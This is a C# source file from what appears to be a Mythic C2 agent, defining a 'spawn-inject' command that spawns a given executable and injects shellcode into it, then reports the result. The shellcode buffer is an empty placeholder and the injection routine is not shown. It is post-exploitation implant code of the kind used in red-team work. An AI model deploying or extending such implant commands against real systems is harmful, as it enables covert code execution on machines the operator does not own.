using Injection;

using Models.Tasks;

using Extend;

namespace Tasks.Commands
{
    public class SpawnInject : CerberusCommand
    {
        public override string Name => "spawn-inject";

        public override MythicTaskResult Execute(MythicTask task)
        {
            MythicTaskResult result;

            var Arguments = task.parameters.Split(' ');
            var FileBytes = new byte[10];

            if (Arguments is null || Arguments.Length == 0)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "No path specified. Please specify the path the executable you want to inject into",
                    completed = true,
                    status = "Error",
                    error = "No path speicified"
                };
                return result;
            }

            var path = Arguments[0];

            var injector = new SpawnInjector();
            var success = injector.Inject(FileBytes, 0, path);

            if (success)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Shellcode injected",
                    completed = true,
                    status = "success",
                };
            }
            else
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Failed to inject shellcode",
                    completed = true,
                    status = "Error",
                    error = "Failed to inject shellcode"
                };
            }

            return result;
        }
    }
}
